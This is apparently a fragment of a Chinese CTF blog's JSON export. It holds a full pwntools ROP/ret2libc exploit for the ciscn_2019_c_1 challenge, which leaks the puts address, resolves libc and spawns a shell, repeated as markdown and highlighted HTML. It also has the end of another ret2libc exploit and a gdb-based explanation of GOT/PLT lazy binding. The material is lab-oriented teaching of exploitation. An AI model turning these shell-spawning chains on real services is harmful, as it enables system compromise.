class=\"hljs-string\">b&#x27;a&#x27;</span> + p32(system) + p32(<span class=\"hljs-number\">0xdeadbeef</span>) + p32(binsh)<br>p.sendline(payload3)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>\n\n"},{"title":"ROP ciscn_2019_c_1","date":"2022-11-16T11:07:00.000Z","excerpt":"exp","_content":"\n**题目**\n\n<https://buuoj.cn/challenges#ciscn_2019_c_1>\n\n**Exp**\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\np = process('./ciscn_2019_c_1')\n# p = remote('node4.buuoj.cn',29563) \nelf = ELF('./ciscn_2019_c_1')\n\nret=0x4006b9\nrdi=0x400c83\nmain=elf.sym['main']\nputs_plt=elf.plt['puts']\nputs_got=elf.got['puts']\n\n#第一次攻击绕过函数\np.sendlineafter(b'Input your choice!\\n',b'1')\npayload=b'\\0'+b'a'*(0x50-1+8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)\np.sendlineafter(b'Input your Plaintext to be encrypted\\n',payload)\n \n \n \np.recvline()\t#接收字符串Ciphertext\np.recvline()    #加密后的密文\n#这里注意需要接收2次\n \nputs_addr=u64(p.recvuntil(b'\\n')[:-1].ljust(8,b'\\0'))  #得到 puts 函数 的地址\n\nprint(hex(puts_addr))\n\nlibc=LibcSearcher('puts',puts_addr) #获取libc的版本\noffset=puts_addr-libc.dump('puts') #计算偏移量\nbinsh=offset+libc.dump('str_bin_sh') #计算字符串\"/bin/sh\"的地址\nsystem=offset+libc.dump('system') #计算函数system的地址\n \n#第二次攻击getshell\n \np.sendlineafter(b'Input your choice!\\n',b'1')     #   再一次执行 一遍流程\npayload=b'\\0'+b'a'*(0x50-1+8)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)\np.sendlineafter(b'Input your Plaintext to be encrypted\\n',payload)\np.interactive()\n\n\n\n# ubuntu18版本以上调用64位程序中的system函数的栈对齐问题\n# https://www.cnblogs.com/ZIKH26/articles/15996874.html\n```","source":"_posts/ROP ciscn_2019_c_1.md","raw":"---\ntitle: ROP ciscn_2019_c_1\ntags: [ctf-pwn,exp]\ndate: 2022-11-16 19:07:00\nexcerpt: exp\n---\n\n**题目**\n\n<https://buuoj.cn/challenges#ciscn_2019_c_1>\n\n**Exp**\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\np = process('./ciscn_2019_c_1')\n# p = remote('node4.buuoj.cn',29563) \nelf = ELF('./ciscn_2019_c_1')\n\nret=0x4006b9\nrdi=0x400c83\nmain=elf.sym['main']\nputs_plt=elf.plt['puts']\nputs_got=elf.got['puts']\n\n#第一次攻击绕过函数\np.sendlineafter(b'Input your choice!\\n',b'1')\npayload=b'\\0'+b'a'*(0x50-1+8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)\np.sendlineafter(b'Input your Plaintext to be encrypted\\n',payload)\n \n \n \np.recvline()\t#接收字符串Ciphertext\np.recvline()    #加密后的密文\n#这里注意需要接收2次\n \nputs_addr=u64(p.recvuntil(b'\\n')[:-1].ljust(8,b'\\0'))  #得到 puts 函数 的地址\n\nprint(hex(puts_addr))\n\nlibc=LibcSearcher('puts',puts_addr) #获取libc的版本\noffset=puts_addr-libc.dump('puts') #计算偏移量\nbinsh=offset+libc.dump('str_bin_sh') #计算字符串\"/bin/sh\"的地址\nsystem=offset+libc.dump('system') #计算函数system的地址\n \n#第二次攻击getshell\n \np.sendlineafter(b'Input your choice!\\n',b'1')     #   再一次执行 一遍流程\npayload=b'\\0'+b'a'*(0x50-1+8)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)\np.sendlineafter(b'Input your Plaintext to be encrypted\\n',payload)\np.interactive()\n\n\n\n# ubuntu18版本以上调用64位程序中的system函数的栈对齐问题\n# https://www.cnblogs.com/ZIKH26/articles/15996874.html\n```","slug":"ROP ciscn_2019_c_1","published":1,"updated":"2022-11-28T04:33:16.332Z","_id":"clajrmefz0002kgufc7qf1x4g","comments":1,"layout":"post","photos":[],"link":"","content":"<p><strong>题目</strong></p>\n<p><a href=\"https://buuoj.cn/challenges#ciscn_2019_c_1\">https://buuoj.cn/challenges#ciscn_2019_c_1</a></p>\n<p><strong>Exp</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> LibcSearcher <span class=\"hljs-keyword\">import</span> *<br>p = process(<span class=\"hljs-string\">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><span class=\"hljs-comment\"># p = remote(&#x27;node4.buuoj.cn&#x27;,29563) </span><br>elf = ELF(<span class=\"hljs-string\">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><br>ret=<span class=\"hljs-number\">0x4006b9</span><br>rdi=<span class=\"hljs-number\">0x400c83</span><br>main=elf.sym[<span class=\"hljs-string\">&#x27;main&#x27;</span>]<br>puts_plt=elf.plt[<span class=\"hljs-string\">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class=\"hljs-string\">&#x27;puts&#x27;</span>]<br><br><span class=\"hljs-comment\">#第一次攻击绕过函数</span><br>p.sendlineafter(<span class=\"hljs-string\">b&#x27;Input your choice!\\n&#x27;</span>,<span class=\"hljs-string\">b&#x27;1&#x27;</span>)<br>payload=<span class=\"hljs-string\">b&#x27;\\0&#x27;</span>+<span class=\"hljs-string\">b&#x27;a&#x27;</span>*(<span class=\"hljs-number\">0x50</span>-<span class=\"hljs-number\">1</span>+<span class=\"hljs-number\">8</span>)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>p.sendlineafter(<span class=\"hljs-string\">b&#x27;Input your Plaintext to be encrypted\\n&#x27;</span>,payload)<br> <br> <br> <br>p.recvline()\t<span class=\"hljs-comment\">#接收字符串Ciphertext</span><br>p.recvline()    <span class=\"hljs-comment\">#加密后的密文</span><br><span class=\"hljs-comment\">#这里注意需要接收2次</span><br> <br>puts_addr=u64(p.recvuntil(<span class=\"hljs-string\">b&#x27;\\n&#x27;</span>)[:-<span class=\"hljs-number\">1</span>].ljust(<span class=\"hljs-number\">8</span>,<span class=\"hljs-string\">b&#x27;\\0&#x27;</span>))  <span class=\"hljs-comment\">#得到 puts 函数 的地址</span><br><br><span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">hex</span>(puts_addr))<br><br>libc=LibcSearcher(<span class=\"hljs-string\">&#x27;puts&#x27;</span>,puts_addr) <span class=\"hljs-comment\">#获取libc的版本</span><br>offset=puts_addr-libc.dump(<span class=\"hljs-string\">&#x27;puts&#x27;</span>) <span class=\"hljs-comment\">#计算偏移量</span><br>binsh=offset+libc.dump(<span class=\"hljs-string\">&#x27;str_bin_sh&#x27;</span>) <span class=\"hljs-comment\">#计算字符串&quot;/bin/sh&quot;的地址</span><br>system=offset+libc.dump(<span class=\"hljs-string\">&#x27;system&#x27;</span>) <span class=\"hljs-comment\">#计算函数system的地址</span><br> <br><span class=\"hljs-comment\">#第二次攻击getshell</span><br> <br>p.sendlineafter(<span class=\"hljs-string\">b&#x27;Input your choice!\\n&#x27;</span>,<span class=\"hljs-string\">b&#x27;1&#x27;</span>)     <span class=\"hljs-comment\">#   再一次执行 一遍流程</span><br>payload=<span class=\"hljs-string\">b&#x27;\\0&#x27;</span>+<span class=\"hljs-string\">b&#x27;a&#x27;</span>*(<span class=\"hljs-number\">0x50</span>-<span class=\"hljs-number\">1</span>+<span class=\"hljs-number\">8</span>)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)<br>p.sendlineafter(<span class=\"hljs-string\">b&#x27;Input your Plaintext to be encrypted\\n&#x27;</span>,payload)<br>p.interactive()<br><br><br><br><span class=\"hljs-comment\"># ubuntu18版本以上调用64位程序中的system函数的栈对齐问题</span><br><span class=\"hljs-comment\"># https://www.cnblogs.com/ZIKH26/articles/15996874.html</span><br></code></pre></td></tr></table></figure>","site":{"data":{}},"more":"<p><strong>题目</strong></p>\n<p><a href=\"https://buuoj.cn/challenges#ciscn_2019_c_1\">https://buuoj.cn/challenges#ciscn_2019_c_1</a></p>\n<p><strong>Exp</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> LibcSearcher <span class=\"hljs-keyword\">import</span> *<br>p = process(<span class=\"hljs-string\">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><span class=\"hljs-comment\"># p = remote(&#x27;node4.buuoj.cn&#x27;,29563) </span><br>elf = ELF(<span class=\"hljs-string\">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><br>ret=<span class=\"hljs-number\">0x4006b9</span><br>rdi=<span class=\"hljs-number\">0x400c83</span><br>main=elf.sym[<span class=\"hljs-string\">&#x27;main&#x27;</span>]<br>puts_plt=elf.plt[<span class=\"hljs-string\">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class=\"hljs-string\">&#x27;puts&#x27;</span>]<br><br><span class=\"hljs-comment\">#第一次攻击绕过函数</span><br>p.sendlineafter(<span class=\"hljs-string\">b&#x27;Input your choice!\\n&#x27;</span>,<span class=\"hljs-string\">b&#x27;1&#x27;</span>)<br>payload=<span class=\"hljs-string\">b&#x27;\\0&#x27;</span>+<span class=\"hljs-string\">b&#x27;a&#x27;</span>*(<span class=\"hljs-number\">0x50</span>-<span class=\"hljs-number\">1</span>+<span class=\"hljs-number\">8</span>)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>p.sendlineafter(<span class=\"hljs-string\">b&#x27;Input your Plaintext to be encrypted\\n&#x27;</span>,payload)<br> <br> <br> <br>p.recvline()\t<span class=\"hljs-comment\">#接收字符串Ciphertext</span><br>p.recvline()    <span class=\"hljs-comment\">#加密后的密文</span><br><span class=\"hljs-comment\">#这里注意需要接收2次</span><br> <br>puts_addr=u64(p.recvuntil(<span class=\"hljs-string\">b&#x27;\\n&#x27;</span>)[:-<span class=\"hljs-number\">1</span>].ljust(<span class=\"hljs-number\">8</span>,<span class=\"hljs-string\">b&#x27;\\0&#x27;</span>))  <span class=\"hljs-comment\">#得到 puts 函数 的地址</span><br><br><span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">hex</span>(puts_addr))<br><br>libc=LibcSearcher(<span class=\"hljs-string\">&#x27;puts&#x27;</span>,puts_addr) <span class=\"hljs-comment\">#获取libc的版本</span><br>offset=puts_addr-libc.dump(<span class=\"hljs-string\">&#x27;puts&#x27;</span>) <span class=\"hljs-comment\">#计算偏移量</span><br>binsh=offset+libc.dump(<span class=\"hljs-string\">&#x27;str_bin_sh&#x27;</span>) <span class=\"hljs-comment\">#计算字符串&quot;/bin/sh&quot;的地址</span><br>system=offset+libc.dump(<span class=\"hljs-string\">&#x27;system&#x27;</span>) <span class=\"hljs-comment\">#计算函数system的地址</span><br> <br><span class=\"hljs-comment\">#第二次攻击getshell</span><br> <br>p.sendlineafter(<span class=\"hljs-string\">b&#x27;Input your choice!\\n&#x27;</span>,<span class=\"hljs-string\">b&#x27;1&#x27;</span>)     <span class=\"hljs-comment\">#   再一次执行 一遍流程</span><br>payload=<span class=\"hljs-string\">b&#x27;\\0&#x27;</span>+<span class=\"hljs-string\">b&#x27;a&#x27;</span>*(<span class=\"hljs-number\">0x50</span>-<span class=\"hljs-number\">1</span>+<span class=\"hljs-number\">8</span>)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)<br>p.sendlineafter(<span class=\"hljs-string\">b&#x27;Input your Plaintext to be encrypted\\n&#x27;</span>,payload)<br>p.interactive()<br><br><br><br><span class=\"hljs-comment\"># ubuntu18版本以上调用64位程序中的system函数的栈对齐问题</span><br><span class=\"hljs-comment\"># https://www.cnblogs.com/ZIKH26/articles/15996874.html</span><br></code></pre></td></tr></table></figure>"},{"title":"GOT表和PLT表","date":"2022-11-16T08:08:00.000Z","excerpt":"Linux 动态链接与延迟绑定机制","_content":"\nLinux 动态链接与延迟绑定机制\n\n**Q：**\n\n1. 为什么ret2libc泄露基址时要选择已经使用过的函数？\n2. 何为延迟绑定？\n\n## Linux 动态链接与延迟绑定机制\n\n​    假设，写了一个函数```f()```，调用了glibc中函数```x()```，在可执行文件是如何编译的？\n\n​\t对于libc中的函数，例如system、puts、write等，需要在程序运行时动态加载到内存中，不同版本的libc加载的位置各不相同，gcc没有办法直接在函数```f()```的汇编指令中直接call函数```x()```的真实地址\n\n​\t因此，需要在调用前加入一个寻找函数地址的过程\n\n```assembly\n.text\n ...\n call f_stub\n ...\n \n ...\n f_stub:\n \t 1. find and save function f() entry point in f_stub_addr\n     2. mov eax, [f_addr]\n        jmp eax\n ...\n \n.data\n f_addr  // 存储实际的f()地址\n```\n\n​\t如上述过程，f_stub去寻找实际的地址，存储在f_addr中，然后调用它\n\n​\tlinux的动态链接过程与上述类似，也是由一个存放外部函数地址数据GOT表（对应f_addr)，和一段函数调用额外的代码PLT表（对应f_stub)\n\n​\t后文会具体分析其机制\n\n\n\n\n##### 实验参考\n\n<https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL>\n\n<https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click>\n\n##### 代码\n\n```C\n#include <stdio.h>\nvoid print_banner()\n{\n    printf(\"Welcome to World of PLT and GOT\\n\");\n}\nint main(void)\n{\n    print_banner();\n    return 0;\n}\n```\n\n##### 编译链接\n\n```gcc -Wall  -g test.c -o test.o -m32```\n\n**平台**： **kali**-**linux**\n\n开始调试\n\n**首先，在printf函数调用前下一个断点**\n\n![](/img/plt&got/1.png)\n\n```assembly\n[-------------------------------------code-------------------------------------]\n   0x555555555134 <frame_dummy+4>:      jmp    0x5555555550b0 <register_tm_clones>\n   0x555555555139 <print_banner>:       push   rbp\n   0x55555555513a <print_banner+1>:     mov    rbp,rsp\n=> 0x55555555513d <print_banner+4>:     lea    rax,[rip+0xec4]        # 0x555555556008\n   0x555555555144 <print_banner+11>:    mov    rdi,rax\n   0x555555555147 <print_banner+14>:    call   0x555555555030 <puts@plt>\n   0x55555555514c <print_banner+19>:    nop\n   0x55555555514d <print_banner+20>:    pop    rbp\n```\n\n跳转到了0x555555555030这个地址，gdb对其的标注为\\<puts@plt\\>\n\n查看一下这个地址上的内容\n\n```assembly\ngdb-peda$ x/10i 0x555555555030\n   0x555555555030 <puts@plt>:   jmp    QWORD PTR [rip+0x2fca]        # 0x555555558000 <puts@got[plt]>\n   0x555555555036 <puts@plt+6>: push   0x0\n   0x55555555503b <puts@plt+11>:        jmp    0x555555555020\n```\n\n这里第一条指令，jmp 0x555555558000，gdb对其的标注为\\<puts@got[plt]\\>，查看这个地址上的值，会发现这个指令在原地跳转：\n\n```assembly\ngdb-peda$ x/x 0x555555558000 \n0x555555558000 <puts@got[plt]>: 0x0000555555555036 //这个地址就是上面plt表的第二条指令\n```\n\n相当于什么也没做\n\n那么根据文章开头的介绍，寻找函数的工作肯定是由第三条指令，```jmp 0x555555555020```来完成的，这里先不对这个函数进行分析，直接来看结果\n\n**在printf函数后面下断点，重新查看刚才\\<puts@got[plt]\\>上的内容**\n\n![](/img/plt&got/2.jpg)\n\n```assembly\ngdb-peda$ x/x 0x555555558000\n0x555555558000 <puts@got[plt]>: 0x00007ffff7c75db0\n```\n\n发现这个地方的值变了，而这个改变后的值就是puts函数在libc中的地址\n\n```assembly\ngdb-peda$ x/10i 0x00007ffff7c75db0\n   0x7ffff7c75db0 <__GI__IO_puts>:      push   r14\n   0x7ffff7c75db2 <__GI__IO_puts+2>:    push   r13\n   0x7ffff7c75db4 <__GI__IO_puts+4>:    push   r12\n   0x7ffff7c75db6 <__GI__IO_puts+6>:    mov    r12,rdi\n   0x7ffff7c75db9 <__GI__IO_puts+9>:    push   rbp\n   0x7ffff7c75dba <__GI__IO_puts+10>:   push   rbx\n   0x7ffff7c75dbb <__GI__IO_puts+11>:   sub    rsp,0x10\n   0x7ffff7c75dbf <__GI__IO_puts+15>:   call   0x7ffff7c28110 <*ABS*+0x99da0@plt>\n   0x7ffff7c75dc4 <__GI__IO_puts+20>:   mov    r13,QWORD PTR [rip+0x17e04d]        # 0x7ffff7df3e18\n   0x7ffff7c75dcb <__GI__IO_puts+27>:   mov    rbx,rax\n```\n\n**因此可以得出结论**\n\n​\tplt表中会先尝试跳转到got表上的函数地址，如果是第一次调用，会进行一次无效跳转，然后去寻找真正的地址填充在got表项上，然后调用；如果是第二次调用，会直接jmp到got表真实的函数地址上\n\n​\t这样就是为什么ret2libc需要使用用已被调用过的函数\n\n*tips：*\n\n*linux程序都有一个libc_start_main函数，且会在main函数之前被调用，所以可以在ret2libc时无脑用这个函数(只是个人猜测，并未实际验证)*\n\n\n\n**然后解决如何寻找函数地址的问题**：\n\n​\t在plt表的第二条汇编指令中，push 0x0为寻址函数提供了一个参数，如果打开一个具有多个plt表项的程序，会发现每一项这个值都是不同的：\n\n![](/img/plt&got/3.jpg)\n\n​\t这个push的值唯一标识了寻找的函数，\n\n​\t然后再看第三条指令，观察发现这个jmp指令跳转到了plt表的开头（可以在objdump里看到这也是一个plt表项，但是代码与其他表项形式不同）\n\n```assembly\ngdb-peda$ x/10i 0x555555555020\n   0x555555555020:      push   QWORD PTR [rip+0x2fca]        # 0x555555557ff0\n   0x555555555026:      jmp    QWORD PTR [rip+0x2fcc]        # 0x555555557ff8\n```\n\n如果在gdb未开始调试的时候，查看这个jmp的值，是0x0\n\n而在printf函数前的断点查看，会发现它发生了变化\n\n```assembly\ngdb-peda$ x/x 0x555555557ff8\n0x555555557ff8: 0x00007ffff7fdc080\n\ngdb-peda$ x/10i 0x00007ffff7fdc080\n   0x7ffff7fdc080 <_dl_runtime_resolve_xsavec>: push   rbx\n   0x7ffff7fdc081 <_dl_runtime_resolve_xsavec+1>:       mov    rbx,rsp\n   0x7ffff7fdc084 <_dl_runtime_resolve_xsavec+4>:       and    rsp,0xffffffffffffffc0\n   0x7ffff7fdc088 <_dl_runtime_resolve_xsavec+8>:\n    sub    rsp,QWORD PTR [rip+0x20be1]        # 0x7ffff7ffcc70 <_rtld_global_ro+432>\n   0x7ffff7fdc08f <_dl_runtime_resolve_xsavec+15>:      mov    QWORD PTR [rsp],rax\n   0x7ffff7fdc093 <_dl_runtime_resolve_xsavec+19>:      mov    QWORD PTR [rsp+0x8],rcx\n   0x7ffff7fdc098 <_dl_runtime_resolve_xsavec+24>:      mov    QWORD PTR [rsp+0x10],rdx\n   0x7ffff7fdc09d <_dl_runtime_resolve_xsavec+29>:      mov    QWORD PTR [rsp+0x18],rsi\n   0x7ffff7fdc0a2 <_dl_runtime_resolve_xsavec+34>:      mov    QWORD PTR [rsp+0x20],rdi\n   0x7ffff7fdc0a7 <_dl_runtime_resolve_xsavec+39>:      mov    QWORD PTR [rsp+0x28],r8\n\n```\n\n这个函数为```_dl_runtime_resolve(link_map_obj, reloc_index)```，此处不在对其具体分析，其用处即为寻找编号为```reloc_index```的函数\n\n\n\n##### 整体流程\n\n**第一次调用**\n\n![](/img/plt&got/4.jpg)\n\n**第二次调用**\n\n![](/img/plt&got/5.jpg)\n\n","source":"_posts/got表和plt表.md","raw":"---\ntitle: GOT表和PLT表\ntags: [ctf-pwn]\ndate: 2022-11-16 16:08:00\nexcerpt: Linux 动态链接与延迟绑定机制\n---\n\nLinux 动态链接与延迟绑定机制\n\n**Q：**\n\n1. 为什么ret2libc泄露基址时要选择已经使用过的函数？\n2. 何为延迟绑定？\n\n## Linux 动态链接与延迟绑定机制\n\n​    假设，写了一个函数```f()```，调用了glibc中函数```x()```，在可执行文件是如何编译的？\n\n​\t对于libc中的函数，例如system、puts、write等，需要在程序运行时动态加载到内存中，不同版本的libc加载的位置各不相同，gcc没有办法直接在函数```f()```的汇编指令中直接call函数```x()```的真实地址\n\n​\t因此，需要在调用前加入一个寻找函数地址的过程\n\n```assembly\n.text\n ...\n call f_stub\n ...\n \n ...\n f_stub:\n \t 1. find and save function f() entry point in f_stub_addr\n     2. mov eax, [f_addr]\n        jmp eax\n ...\n \n.data\n f_addr  // 存储实际的f()地址\n```\n\n​\t如上述过程，f_stub去寻找实际的地址，存储在f_addr中，然后调用它\n\n​\tlinux的动态链接过程与上述类似，也是由一个存放外部函数地址数据GOT表（对应f_addr)，和一段函数调用额外的代码PLT表（对应f_stub)\n\n​\t后文会具体分析其机制\n\n\n\n\n##### 实验参考\n\n<https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL>\n\n<https://www.bilibili.com/video/BV1a7411p7zK/?spm_id_from=333.337.search-card.all.click>\n\n##### 代码\n\n```C\n#include <stdio.h>\nvoid print_banner()\n{\n    printf(\"Welcome to World of PLT and GOT\\n\");\n}\nint main(void)\n{\n    print_banner();\n    return 0;\n}\n```\n\n##### 编译链接\n\n```gcc -Wall  -g test.c -o test.o -m32```\n\n**平台**： **kali**-**linux**\n\n开始调试\n\n**首先，在printf函数调用前下一个断点**\n\n![](/img/plt&got/1.png)\n\n```assembly\n[-------------------------------------code-------------------------------------]\n   0x555555555134 <frame_dummy+4>:      jmp    0x5555555550b0 <register_tm_clones>\n   0x555555555139 <print_banner>:       push   rbp\n   0x55555555513a <print_banner+1>:     mov    rbp,rsp\n=> 0x55555555513d <print_banner+4>:     lea    rax,[rip+0xec4]        # 0x555555556008\n   0x555555555144 <print_banner+11>:    mov    rdi,rax\n   0x555555555147 <print_banner+14>:    call   0x555555555030 <puts@plt>\n   0x55555555514c <print_banner+19>:    nop\n   0x55555555514d <print_banner+20>:    pop    rbp\n```\n\n跳转到了0x555555555030这个地址，gdb对其的标注为\\<puts@plt\\>\n\n查看一下这个地址上的内容\n\n```assembly\ngdb-peda$ x/10i 0x555555555030\n   0x555555555030 <puts@plt>:   jmp    QWORD PTR [rip+0x2fca]        # 0x555555558000 <puts@got[plt]>\n   0x555555555036 <puts@plt+6>: push   0x0\n   0x55555555503b <puts@plt+11>:        jmp    0x555555555020\n```\n\n这里第一条指令，jmp 0x555555558000，gdb对其的标注为\\<puts@got[plt]\\>，查看这个地址上的值，会发现这个指令在原地跳转：\n\n```assembly\ngdb-peda$ x/x 0x555555558000 \n0x555555558000 <puts@got[plt]>: 0x0000555555555036 //这个地址就是上面plt表的第二条指令\n```\n\n相当于什么也没做\n\n那么根据文章开头的介绍，寻找函数的工作肯定是由第三条指令，```jmp 0x555555555020```来完成的，这里先不对这个函数进行分析，直接来看结果\n\n**在printf函数后面下断点，重新查看刚才\\<puts@got[plt]\\>上的内容**\n\n![](/img/plt&got/2.jpg)\n\n```assembly\ngdb-peda$ x/x 0x555555558000\n0x555555558000 <puts@got[plt]>: 0x00007ffff7c75db0\n```\n\n发现这个地方的值变了，而这个改变后的值就是puts函数在libc中的地址\n\n```assembly\ngdb-peda$ x/10i 0x00007ffff7c75db0\n   0x7ffff7c75db0 <__GI__IO_puts>:      push   r14\n   0x7ffff7c75db2 <__GI__IO_puts+2>:    push   r13\n   0x7ffff7c75db4 <__GI__IO_puts+4>:    push   r12\n   0x7ffff7c75db6 <__GI__IO_puts+6>:    mov    r12,rdi\n   0x7ffff7c75db9 <__GI__IO_puts+9>:    push   rbp\n   0x7ffff7c75dba <__GI__IO_puts+10>:   push   rbx\n   0x7ffff7c75dbb <__GI__IO_puts+11>:   sub    rsp,0x10\n   0x7ffff7c75dbf <__GI__IO_puts+15>:   call   0x7ffff7c28110 <*ABS*+0x99da0@plt>\n   0x7ffff7c75dc4 <__GI__IO_puts+20>:   mov    r13,QWORD PTR [rip+0x17e04d]        # 0x7ffff7df3e18\n   0x7ffff7c75dcb <__GI__IO_puts+27>:   mov    rbx,rax\n```\n\n**因此可以得出结论**\n\n​\tplt表中会先尝试跳转到got表上的函数地址，如果是第一次调用，会进行一次无效跳转，然后去寻找真正的地址填充在got表项上，然后调用；如果是第二次调用，会直接jmp到got表真实的函数地址上\n\n​\t这样就是为什么ret2libc需要使用用已被调用过的函数\n\n*tips：*\n\n*linux程序都有一个libc_start_main函数，且会在main函数之前被调用，所以可以在ret2libc时无脑用这个函数(只是个人猜测，并未实际验证)*\n\n\n\n**然后解决如何寻找函数地址的问题**：\n\n​\t在plt表的第二条汇编指令中，push 0x0为寻址函数提供了一个参数，如果打开一个具有多个plt表项的程序，会发现每一项这个值都是不同的：\n\n![](/img/plt&got/3.jpg)\n\n​\t这个push的值唯一标识了寻找的函数，\n\n​\t然后再看第三条指令，观察发现这个jmp指令跳转到了plt表的开头（可以在objdump里看到这也是一个plt表项，但是代码与其他表项形式不同）\n\n```assembly\ngdb-peda$ x/10i 0x555555555020\n   0x555555555020:      push   QWORD PTR [rip+0x2fca]        # 0x555555557ff0\n   0x555555555026:      jmp    QWORD PTR [rip+0x2fcc]        # 0x555555557ff8\n```\n\n如果在gdb未开始调试的时候，查看这个jmp的值，是0x0\n\n而在printf函数前的断点查看，会发现它发生了变化\n\n```assembly\ngdb-peda$ x/x 0x555555557ff8\n0x555555557ff8: 0x00007ffff7fdc080\n\ngdb-peda$ x/10i 0x00007ffff7fdc080\n   0x7ffff7fdc080 <_dl_runtime_resolve_xsavec>: push   rbx\n   0x7ffff7fdc081 <_dl_runtime_resolve_xsavec+1>:       mov    rbx,rsp\n   0x7ffff7fdc084 <_dl_runtime_resolve_xsavec+4>:       and    rsp,0xffffffffffffffc0\n   0x7ffff7fdc088 <_dl_runtime_resolve_xsavec+8>:\n    sub    rsp,QWORD PTR [rip+0x20be1]        # 0x7ffff7ffcc70 <_rtld_global_ro+432>\n   0x7ffff7fdc08f <_dl_runtime_resolve_xsavec+15>:      mov    QWORD PTR [rsp],rax\n   0x7ffff7fdc093 <_dl_runtime_resolve_xsavec+19>:      mov    QWORD PTR [rsp+0x8],rcx\n   0x7ffff7fdc098 <_dl_runtime_resolve_xsavec+24>:      mov    QWORD PTR [rsp+0x10],rdx\n   0x7ffff7fdc09d <_dl_runtime_resolve_xsavec+29>:      mov    QWORD PTR [rsp+0x18],rsi\n   0x7ffff7fdc0a2 <_dl_runtime_resolve_xsavec+34>:      mov    QWORD PTR [rsp+0x20],rdi\n   0x7ffff7fdc0a7 <_dl_runtime_resolve_xsavec+39>:      mov    QWORD PTR [rsp+0x28],r8\n\n```\n\n这个函数为```_dl_runtime_resolve(link_map_obj, reloc_index)```，此处不在对其具体分析，其用处即为寻找编号为```reloc_index```的函数\n\n\n\n##### 整体流程\n\n**第一次调用**\n\n![](/img/plt&got/4.jpg)\n\n**第二次调用**\n\n![](/img/plt&got/5.jpg)\n\n","slug":"got表和plt表","published":1,"updated":"2022-11-16T16:03:44.613Z","_id":"clajrmeg20004kgufh5hwcc7u","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Linux 动态链接与延迟绑定机制</p>\n<p><strong>Q：</strong></p>\n<ol>\n<li>为什么ret2libc泄露基址时要选择已经使用过的函数？</li>\n<li>何为延迟绑定？</li>\n</ol>\n<h2 id=\"Linux-动态链接与延迟绑定机制\"><a href=\"#Linux-动态链接与延迟绑定机制\" class=\"headerlink\" title=\"Linux 动态链接与延迟绑定机制\"></a>Linux 动态链接与延迟绑定机制</h2><p>​    假设，写了一个函数<code>f()</code>，调用了glibc中函数<code>x()</code>，在可执行文件是如何编译的？</p>\n<p>​    